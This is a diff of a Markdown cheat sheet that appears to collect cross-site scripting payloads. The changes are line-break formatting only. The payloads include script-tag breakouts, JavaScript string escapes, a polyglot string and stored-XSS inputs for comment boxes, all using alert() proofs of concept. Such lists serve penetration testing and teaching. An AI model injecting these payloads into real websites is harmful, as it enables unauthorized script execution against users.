@@ -12,31 +12,23 @@
 
 ### escape script and backslash
 
-`</script><img src=1 onerror=alert(document.domain)>`
-
+`</script><img src=1 onerror=alert(document.domain)>`  
 `</script><script>alert(1)</script>`
 
 ### Brak out of javascript string
 
-`'-alert(document.domain)-'`
-
-`'+alert(document.domain)+'`
-
-`';alert(document.domain)//`
-
-`http://foo?&apos;-alert(1)-&apos;`
-
-`${alert(document.domain)}`
-
-`javascript:"/*'/*'/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>`
-
+`'-alert(document.domain)-'`  
+`'+alert(document.domain)+'`  
+`';alert(document.domain)//`  
+`http://foo?&apos;-alert(1)-&apos;`  
+`${alert(document.domain)}`  
+`javascript:"/*'/*'/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>`  
 
 ## Stored
 
 Enter the following into the comment box
 
-`<script>alert(1)</script>`
-
+`<script>alert(1)</script>`  
 `"onmouseover="alert(1)`
 
 Inserted in GET/POST request
